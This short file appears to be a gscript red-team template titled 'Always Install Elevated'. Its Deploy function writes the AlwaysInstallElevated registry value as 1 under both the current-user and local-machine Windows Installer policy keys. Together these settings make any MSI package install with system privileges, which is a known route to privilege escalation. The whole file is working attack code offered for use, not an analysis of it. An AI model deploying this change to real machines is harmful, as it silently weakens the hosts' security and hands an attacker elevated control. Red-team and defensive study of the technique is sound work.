// Example gscript template
// Title: Always Install Elevated
// Author: ahhh
// Purpose: Always Install Elevated
// Gscript version: 1.0.0
// ATT&CK: 

//priority:98
//timeout:150

//go_import:github.com/gen0cide/gscript/x/windows as windows

function Deploy() {
    console.log("Starting Install Elevated");

    var value = 1;
    windows.AddRegKeyDWORD("CURRENT_USER", "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", "AlwaysInstallElevated", value);
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", "AlwaysInstallElevated", value);

    console.log("Done Install Elevated");
    return true;
  }
  